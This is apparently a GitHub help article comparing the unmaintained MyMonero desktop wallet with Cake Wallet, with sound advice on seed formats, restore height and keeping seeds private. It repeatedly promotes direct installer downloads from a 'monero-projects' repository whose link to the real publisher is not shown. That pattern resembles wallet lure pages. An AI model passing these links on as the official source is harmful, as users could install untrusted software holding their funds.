<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero vs Cake Wallet Comparison</h1>
<p align="center">Compare the remaining practical paths by platform, maintenance, and migration behavior.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
MyMonero desktop can still open wallets and send XMR, but its final release v1.3.3 is no longer maintained. Cake Wallet is the alternative described here and supports iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing.

## You'll see this if
- You want to understand what changed after MyMonero hosted access stopped.
- You are deciding whether to keep the old desktop app or restore a wallet elsewhere.
- You need to distinguish restoring a seed from transferring funds.
- You are choosing a platform before migrating.

## Why it happens
MyMonero hosted servers and web wallet login stopped. MyMonero’s final desktop version is v1.3.3. The old app still opens wallets and sends XMR, but is not maintained and receives no new features or security updates. The available choices are to continue using it or restore the seed in Cake Wallet.

Cake Wallet runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Availability therefore matters: users who specifically require a Windows desktop build should not assume Cake Wallet currently provides one. Neither option changes what the seed means. MyMonero’s 13-word phrase is a MyMonero-specific legacy format; a 25-word phrase is standard Monero. See [seed format differences](./mymonero-seed-13-vs-25-words.md).

Restoration provides access to the existing wallet. It does not send XMR to a new address. A sweep or ordinary send is a separate transaction that requires checking the destination and fee. For detailed steps see [MyMonero to Cake Wallet migration](./mymonero-to-cake-wallet-migration.md).

---

## Fix
1. **List your actual needs.** Decide whether you need mobile use, a supported desktop platform, or simply continued access on the current computer. Avoid choosing based on a claim that one option guarantees safety or immediate recovery.
2. **Consider MyMonero desktop’s status.** It remains capable of opening wallets and sending XMR, but it is unmaintained and has no new features or security updates. The final release is v1.3.3. Its release information is on the [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).
3. **Check Cake Wallet platform fit.** It runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Confirm platform availability before planning a restore.
4. **Check your seed format.** Determine whether you have the 13-word MyMonero-specific legacy seed or the standard 25-word Monero seed. Do not change the phrase to fit a screen. Use [13-word restore guidance](./mymonero-13-word-seed-restore.md) or [25-word migration guidance](./mymonero-25-word-seed-migration.md).
5. **Choose restore or transfer.** To access the same wallet in Cake Wallet, restore the seed. To move funds into a different wallet, send or sweep funds to its address. Do not assume installing another app moves coins automatically.
6. **Prepare a private recovery backup.** Find your phrase without sharing it, and verify its word order against your own record. Nobody legitimate asks for the seed. Do not paste it into a webpage, chat, or support request.
7. **Restore with an appropriate height.** Start scanning at or before the relevant activity. Earlier is safer if uncertain but slower. Wait for synchronization to finish before comparing balances. Review [restore height explained](./mymonero-restore-height-explained.md).
8. **Make any transfer only after review.** If you choose to sweep to a new wallet, independently confirm its address and inspect the fee. For a balance that appears incomplete, investigate scanning before sending.

> [!TIP]
> Compare concrete requirements—platform and whether you need access or a transfer—rather than treating migration as a race. Restoring can be a separate, deliberate step.

> [!WARNING]
> Never reveal your seed to compare wallets or receive assistance. Any person who sees it may gain wallet access.

## If that did not work
If Cake Wallet does not accept the phrase, verify its selected restore format and the count in your private backup. Do not make guesses or provide the phrase to another person. For safe checks, see [seed not accepted](./mymonero-seed-not-accepted.md).

If a restored balance is absent, wait for scanning and review the restore height. A late scan start may omit earlier activity. Error 523 is general guidance that a server connection is unavailable, not proof that funds are gone. See [balance shows zero](./mymonero-balance-shows-zero.md) for a sequence of checks.

If you decide to keep using MyMonero desktop, understand its unmaintained status. If you decide to switch, use Cake Wallet on a supported platform and install it from a trusted source. Historical import fees should not be presented as current: MyMonero hosted servers historically charged a one-time fee to import a wallet created elsewhere, but that does not establish a current fee.

## Prevention
Before needing a migration, keep a legible offline seed backup and know its format. Track which platforms you can use and whether the software is maintained. Preserve a reliable restore height separately if known. For a send, verify the destination address in the receiving wallet and review the fee before confirmation. Make a plan that distinguishes restoring access from moving funds. See migration checklist for an organized preparation sequence.

## FAQ
<details><summary>Which wallet is still maintained?</summary>

This brief identifies MyMonero desktop as no longer maintained. Cake Wallet is the named alternative; check its trusted distribution channel for its current releases.

</details>

<details><summary>Does Cake Wallet support Windows desktop?</summary>

Windows desktop builds are paused at the time of writing. Cake Wallet runs on iOS, Android, macOS, and Linux.

</details>

<details><summary>Does restoring move coins?</summary>

No. Restoration provides access to the same wallet. A transfer requires a separate transaction.

</details>

<details><summary>Can I still use MyMonero desktop?</summary>

The old app still opens wallets and sends XMR, but it has no new features or security updates.

</details>

A useful comparison also includes your backup readiness: neither platform choice replaces a seed record you control. If you have not found the phrase yet, avoid uninstalling or discarding access to the current desktop setup until you understand what recovery information you possess. Do not treat a successful installation as proof that a wallet has finished scanning; wait for synchronization and confirm the history you expect before relying on the displayed balance.

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Migration Checklist](./mymonero-migration-checklist.md) | A calm sequence for preparing a wallet restore or a separate funds transfer. |
| [MyMonero to Cake Wallet Migration](./mymonero-to-cake-wallet-migration.md) | How to move your wallet access carefully and keep control of your XMR. |
| [Restore a MyMonero 13-Word Seed](./mymonero-13-word-seed-restore.md) | Recognize the legacy seed format and restore it without exposing your recovery phrase. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
